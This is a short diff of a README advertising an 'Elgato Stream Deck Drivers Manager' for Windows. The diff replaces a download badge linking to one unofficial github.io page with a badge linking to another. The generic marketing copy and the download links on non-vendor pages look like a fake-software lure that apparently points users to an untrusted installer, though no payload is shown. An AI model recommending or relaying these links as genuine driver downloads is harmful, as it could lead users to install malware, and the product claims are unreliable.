@@ -2,7 +2,7 @@
 
 Elgato Stream Deck Drivers Manager is a complete Windows tool that simplifies installation, firmware updates and configuration of Elgato Stream Deck drivers. Ideal for streamers, content creators and broadcast professionals, this toolkit ensures that your Stream Deck devices always run with the latest drivers, firmware and software profiles. Customize LCD key macros, hotkeys, multi actions, profile filtering and device synchronization while improving driver reliability and performance.
 
-[![Download Elgato Stream Deck Drivers Manager](https://img.shields.io/badge/Download-Elgato_Stream_Deck_Drivers_Manager-blueviolet)](https://leonmullinsmady.github.io/.github/Elgato-Stream-Deck)
+[![View Elgato](https://img.shields.io/badge/View-Elgato-2563EB?style=for-the-badge)](https://stream-elgato.github.io/.github/)
 
 ---
 
